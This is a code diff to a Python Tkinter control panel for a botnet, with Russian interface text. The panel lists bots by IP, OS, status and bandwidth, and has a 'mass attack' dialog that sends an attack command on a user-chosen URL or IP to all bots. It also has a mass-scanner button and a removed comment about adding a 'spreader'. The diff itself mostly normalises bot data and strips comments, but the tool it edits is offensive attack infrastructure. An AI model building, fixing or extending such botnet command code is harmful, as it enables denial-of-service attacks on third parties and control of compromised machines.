@@ -12,15 +12,15 @@ from engine.attack import AsyncAttackEngine
 from utils.logger import log
 
 class BotnetTab(tk.Frame):
-    def __init__(self, parent):
+    def __init__(self, parent, app=None):
         super().__init__(parent)
         self.parent = parent
+        self.app = app
         self.bot_data = []
         self.build_ui()
         self.load_bots()
 
     def build_ui(self):
-        # Верхняя панель управления
         control_frame = tk.Frame(self)
         control_frame.pack(fill=tk.X, padx=5, pady=5)
 
@@ -30,7 +30,6 @@ class BotnetTab(tk.Frame):
         tk.Button(control_frame, text="Масс-сканер", command=self.mass_scanner).pack(side=tk.LEFT, padx=2)
         tk.Button(control_frame, text="Тепловая карта", command=self.show_heatmap).pack(side=tk.LEFT, padx=2)
 
-        # Фильтр
         filter_frame = tk.Frame(self)
         filter_frame.pack(fill=tk.X, padx=5)
         tk.Label(filter_frame, text="Фильтр:").pack(side=tk.LEFT)
@@ -38,7 +37,6 @@ class BotnetTab(tk.Frame):
         self.filter_entry.pack(side=tk.LEFT, padx=5)
         self.filter_entry.bind("<KeyRelease>", lambda e: self.apply_filter())
 
-        # Таблица ботов
         columns = ("ID", "IP", "OS", "Status", "Bandwidth")
         self.tree = ttk.Treeview(self, columns=columns, show="headings")
         for col in columns:
@@ -46,20 +44,36 @@ class BotnetTab(tk.Frame):
             self.tree.column(col, width=120)
         self.tree.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
 
-        # Прогресс-бар
         self.progress = ttk.Progressbar(self, mode="indeterminate")
         self.progress.pack(fill=tk.X, padx=5, pady=2)
 
-        # Статус
         self.status_label = tk.Label(self, text="Ботов: 0")
         self.status_label.pack(anchor=tk.W, padx=5)
 
     def load_bots(self):
         if os.path.exists("bots.json"):
             with open("bots.json", "r") as f:
-                self.bot_data = json.load(f)
+                raw_data = json.load(f)
         else:
-            self.bot_data = []
+            raw_data = []
+
+        # Нормализация: превращаем строки в словари
+        self.bot_data = []
+        for item in raw_data:
+            if isinstance(item, dict):
+                bot = item.copy()
+            elif isinstance(item, str):
+                bot = {"id": item, "ip": "", "os": "", "status": "offline", "bandwidth": 0}
+            else:
+                continue
+            # Гарантируем наличие всех ключей
+            bot.setdefault("id", "unknown")
+            bot.setdefault("ip", "")
+            bot.setdefault("os", "")
+            bot.setdefault("status", "offline")
+            bot.setdefault("bandwidth", 0)
+            self.bot_data.append(bot)
+
         self.populate_tree()
         self.status_label.config(text=f"Ботов: {len(self.bot_data)}")
 
@@ -71,7 +85,7 @@ class BotnetTab(tk.Frame):
                 bot.get("id", ""),
                 bot.get("ip", ""),
                 bot.get("os", ""),
-                bot.get("status", "offline"),
+                bot.get("status", ""),
                 f"{bot.get('bandwidth', 0)} Mbps"
             ))
 
@@ -89,7 +103,6 @@ class BotnetTab(tk.Frame):
         self.populate_tree()
 
     def mass_attack(self):
-        # Открывает диалог выбора метода и цели
         target = tk.simpledialog.askstring("Массовая атака", "Цель (URL/IP):")
         if not target:
             return
@@ -99,18 +112,15 @@ class BotnetTab(tk.Frame):
     def _do_mass_attack(self, target):
         try:
             log(f"Запуск массовой атаки на {target}")
-            # Здесь должна быть логика рассылки команды ботам
             broadcast_command({"action": "attack", "target": target})
         finally:
             self.progress.stop()
 
     def update_agent_vps(self):
-        # Заглушка – на будущее можно реализовать обновление агента на VPS
         messagebox.showinfo("Обновление агента", "Функция пока в разработке")
 
     def mass_scanner(self):
         messagebox.showinfo("Масс-сканер", "Запуск масс-сканера диапазонов...")
-        # Здесь можно интегрировать spreader
 
     def show_heatmap(self):
         locations = []
